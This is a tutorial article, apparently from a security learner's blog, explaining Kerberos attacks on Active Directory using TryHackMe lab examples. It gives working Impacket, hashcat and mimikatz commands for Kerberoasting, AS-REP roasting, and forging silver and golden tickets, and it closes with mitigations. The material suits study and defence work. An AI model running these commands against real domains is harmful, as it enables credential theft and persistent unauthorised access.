# Introduction
This article will talk about Kerberos attacks in Active Directory. In order to understand these attacks, first let's go through how does Kerberos works.

### Tools
[Impacket](https://github.com/SecureAuthCorp/impacket) is a set of tools in Linux for Kerberos attacks

[Mimikatz](https://github.com/gentilkiwi/mimikatz) for Windows attacks

### 1. What is Kerberos authentication
Kerberos authentication is an alternate way to authenticate in Active Directory beside NTLM. Traditionally, users use passwords or hashes to authenticate. However, Microsoft implement Kerberos to avoid passing hashes around the network that is vulnerable to many attacks like pass the hash. The authentication process uses service tickets to as an evidence to authenticate. If the user has the correct tickets with enough privileges, they can access to different services based on the permission on the tickets.

Kerberos authentication process:
- Users request TGT: The users send the username and timestamp encrypted with his password to the Key Distribution Center(KDC), which is a service installed on the Domain controller to distribute tickets. The KDC create the Ticket Granting Ticket (TGT) along with a Session Key and send it to the users.
- Users request TGS: Whenever a user wants to access specific service, they will send the TGT and ask for the Ticket Granting Service(TGS), which are tickets that only allow users to access specific services. The KDC then check the TGT information, create the TGS and send it to the users. Users then use the TGS to access the requested service. 

### 1. Kerberos brute-force
Kerberos always indicate if we have the correct username or password. Because of that, it is possible for attackers to brute-force it to enumerate usernames or do the password attacks.

### 2. Kerberoasting

According to the theory of TGS, the TGS is encrypted using service owner's hash. Because of that, attackers can request the tickets by knowing the service principal name(SPN) and then use different password cracking tools to crack it offline.

To perform this attacks, we use a script from Impacket called [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) to request the TGS. The example below is taken from one of the Tryhackme lab at https://tryhackme.com/room/credharvesting

```bash
user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.205.229 THM.red/thm -request-user svc-user 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]7bfa3680658dd9812ac061c5
```

After having the TGSs ticket, we can use [hashcat](https://github.com/hashcat/hashcat) to crack the ticket
```bash
user@machine$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

### 3. ASREP-Roasting

Users that have "Do not require Kerberos pre-authentication enabled" are vulnerable to this attack. This option means that any user can make a AS-REQ request to the Domain Controller as that users, and because of how Kerberos authentication works, the AS-REP response will be the data encrypted with the user password, and we can take the ticket and crack it to get the user password offline. 

![alt text](https://i.stack.imgur.com/n56xn.png)

##### Linux
To perform this attacks, we use a script from Impacket called [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) to gather users do not have Kerberos pre-authentication enabled. 

```bash
root@machine$ python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.205.229 thm.red/ -usersfile /tmp/users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User thm doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$victim@THM.RED:166c95418fb9dc495789fe9[**REMOVED**]1e8d2ef27$6a0e13abb5c99c07
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bk-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-user doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thm-local doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Doing the same method as Kerberoasting, we can crack the ticket offline too.

### 4. Silver ticket
When attackers know the hash of the service account, he can craft a forge TGS ticket and authenticate to the service all the time. This ticket can be used as a persistence in Active Directory.

To perform this attack, we can use mimikatz to create a forge TGS ticket
```bash
mimikatz # kerberos::golden /admin:Legit account /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of targeted server> /rc4:<NTLM Hash of service account of target> /service:cifs /ptt
```
After creating the ticket, we can use it as a authentication method to access resources of the service we want.


### 5. Golden ticket
The Golden ticket technique is similar to the Silver ticket one, however, in this case a TGT is crafted by using the NTLM hash of the krbtgt AD account. The advantage of forging a TGT instead of TGS is being able to access any service (or machine) in the domain.

Golden ticket methodology is same thing as Silver ticket. The only different is we use krbtgt account to create the ticket. It is called Golden ticket because this ticket can be used to access any service in the domain. 

To perform the attack, we only substitute the hash of the account to the krbtgt hash to mimikatz.

```bash
mimikatz # kerberos::golden /admin:LegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /ptt
```
This ticket will be the best thing to have as an attacker in the domain because we can access anything we want.

### Mitigations
In order to prevent or mitigate many of these Kerberos attacks a series of policies can be implemented. Some examples are the following:

- Enable an strong password policy: Using strong password for users account to make it harder for attacker to crack the password

- Do not have accounts without pre-authentication: Always have Kerberos pre-authentication in every account

- Use strong encryption for Kerberos: Only allowed AES encryption for Kerberos

### References
Impacket: https://github.com/SecureAuthCorp/impacket

Mimikatz:  https://github.com/gentilkiwi/mimikatz

Kerberos attacks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast

Attacking Kerberos: https://www.tarlogic.com/blog/how-to-attack-kerberos/

Tryhackme lab: https://tryhackme.com/room/credharvesting
